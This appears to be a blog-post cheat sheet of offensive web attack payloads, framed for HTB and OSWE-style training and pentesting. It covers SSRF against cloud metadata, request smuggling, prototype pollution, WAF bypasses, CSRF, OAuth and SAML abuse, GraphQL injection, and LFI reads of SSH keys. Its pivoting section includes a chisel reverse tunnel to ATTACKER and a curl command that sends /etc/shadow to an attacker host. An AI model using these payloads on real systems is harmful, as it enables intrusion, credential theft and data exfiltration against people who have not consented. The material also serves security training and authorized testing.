---
layout: post
title: "Advanced Web Hacking & Pivoting Cheatsheet"
subtitle: "SSRF, Request Smuggling, Prototype Pollution, WAF bypass, OAuth, SAML, advanced logic flaws and internal pivoting"
tags: [web, advanced, ssrf, smuggling, waf, prototype-pollution, oauth, sso, htb, ctf]
---

Advanced exploitation techniques for modern web applications, including SSRF pivoting, HTTP request smuggling, prototype pollution, WAF bypasses, SSO abuses and internal network pivoting.

---

# 0. ADVANCED WEB EXPLOITATION TOOLS

## Core Tools
- **BurpSuite Pro** (Turbo Intruder, Repeater, Collaborator)  
- **ffuf / wfuzz**  
- **curl + custom headers**  
- **httpx**  
- **mitmproxy**  
- **Interactsh / Burp Collaborator**  
- **amass / subfinder** (external attack surface)  

## Useful Lists & Payloads
- **SecLists Payloads**  
- **PayloadsAllTheThings (Advanced)**  
- **coreruleset bypass payloads**  

---

# 1. SSRF (SERVER-SIDE REQUEST FORGERY)

SSRF allows the server to perform requests on your behalf.

## Basic SSRF payloads
```

[http://127.0.0.1](http://127.0.0.1)
[http://localhost:80](http://localhost:80)
[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)

```

## Bypass URL filters
```

[http://127.0.0.1:80](http://127.0.0.1:80)
[http://0/](http://0/)
[http://2130706433/](http://2130706433/)        # integer ip
[http://127.1/](http://127.1/)             # short notation

```

## DNS rebinding
```

[http://yourdomain.com](http://yourdomain.com) -> resolves internally after rebinding

```

## Read cloud metadata
AWS:
```

[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)

```

GCP:
```

[http://metadata.google.internal/computeMetadata/v1/instance/](http://metadata.google.internal/computeMetadata/v1/instance/)

```

Azure:
```

[http://169.254.169.254/metadata/instance?api-version=2021-01-01](http://169.254.169.254/metadata/instance?api-version=2021-01-01)

```

## Using SSRF as internal port scanner
```

?url=[http://127.0.0.1:80](http://127.0.0.1:80)
?url=[http://10.0.0.5:3306](http://10.0.0.5:3306)

```

---

# 2. HTTP REQUEST SMUGGLING (DESYNC)

Two main types:
- **CL.TE** (Content-Length + Transfer-Encoding)  
- **TE.CL** (Transfer-Encoding + Content-Length)

## Basic CL.TE payload
```

POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G

```

## TE.CL detection (Burp Turbo Intruder)
```

Transfer-Encoding: chunked
Content-Length: <wrong value>

```

## Exploitation outcomes
- Cache poisoning  
- Bypassing auth  
- Hijacking requests  
- Storing malicious responses  

---

# 3. PROTOTYPE POLLUTION (JavaScript)

Most common in Node.js applications.

## Detect pollution
```

?**proto**[polluted]=true

```

## Modify global prototype
```

{"**proto**":{"admin":true}}

```

## Leads to:
- RCE in certain templating engines  
- Authentication bypass  
- Arbitrary property injection  

---

# 4. WAF BYPASS TECHNIQUES

## Encoding bypass examples
```

%2e%2e%2f          → ../
%25%32%65          → . (double-encoded)

```

## Case switching
```

UNiOn SeLeCT

```

## Parameter smuggling
```

?user=admin%26role=admin

```

## JSON bypass (for PHP)
```

{"username":"admin\u0000"}

```

## Space obfuscation
```

/**/union/**/select/**/

```

---

# 5. LOGIC-BASED EXPLOITS & BUSINESS LOGIC HACKING

## Race conditions
```

Turbo Intruder → parallel POST /purchase

```

## Authentication logic flaws
- Missing checks in secondary endpoints  
- Inconsistent state between API and web UI  
- Privilege drift (regular user → admin role)  

## Multi-step bypasses
- Change price on step 1  
- Confirm order on step 2  
- Skip validation with Burp  
- Replay final request  

---

# 6. CSRF ADVANCED

## JSON CSRF
```

Content-Type: application/json

```

Trick browser to send:
```

POST /api/change-email
{"email":"[attacker@evil.com](mailto:attacker@evil.com)"}

```

## SameSite bypass
Inject link *inside* the site:
```

<img src="https://victim.com/change?email=hacker@evil.com">
```

## CORS misconfig

```
Origin: https://attacker.com
Access-Control-Allow-Origin: *
```

---

# 7. OAUTH2 & OIDC ATTACKS

## Redirect URI manipulation

```
redirect_uri=https://attacker.com/callback
```

## Token substitution

Intercept access_token from one OAuth client → replay on another.

## Scope escalation

```
scope=openid email profile admin
```

## Confused deputy attack

Swap client IDs in requests.

---

# 8. SAML & SSO ABUSE

## XML signature wrapping

Inject multiple `<Assertion>` elements.

## Duplicate signature bypass

Replace payload after signature block.

## SAML response tampering (if signature is weak)

Change:

```
<Role>admin</Role>
```

---

# 9. API HACKING & GRAPHQL

## GraphQL introspection

```
{"query":"{__schema{types{name}}}"}
```

## GraphQL injection

```
{"query":"query{user(id:\"1 or 1=1\")}"}
```

## Mass assignment

```
{"admin":true}
```

## Fuzz hidden endpoints

```
ffuf -u http://TARGET/api/FUZZ -w wordlist.txt
```

---

# 10. INTERNAL PIVOTING THROUGH WEB VULNS

### Using SSRF → Internal Port Scan

```
?url=http://10.0.0.5:22
```

### Using LFI → Read SSH keys

```
?page=../../../../home/user/.ssh/id_rsa
```

### Using Upload → Internal RCE

Shell upload → reverse shell to attacker.

### Using webshell → Pivot with chisel/socat from victim

```
./chisel client ATTACKER:8000 R:1080:socks
```

### Using RCE → Exfil internal files

```
curl http://ATTACKER:8000 --data-binary @/etc/shadow
```

---

# 11. CACHE POISONING & CDN ABUSE

## Simple cache poisoning

```
/?cb=attacker
```

## Poisoning via headers

```
X-Forwarded-Host: attacker.com
```

## Cache deception

```
/style.css/../../admin
```

---

# Final Notes

This cheat sheet covers advanced web exploitation techniques:

* SSRF pivoting & cloud metadata extraction
* HTTP Request Smuggling (CL.TE / TE.CL)
* Prototype pollution (browser & Node.js)
* WAF bypass strategies
* OAuth2, SAML & JWT abuses
* Advanced CSRF & CORS misconfigs
* Logic flaws & race conditions
* API/GraphQL exploitation
* Internal pivoting through web vulns
* Cache poisoning & advanced URL manipulation

Useful for HTB Hard/Insane machines, OSEP/OSWE-style training and real-world web pentesting.

---
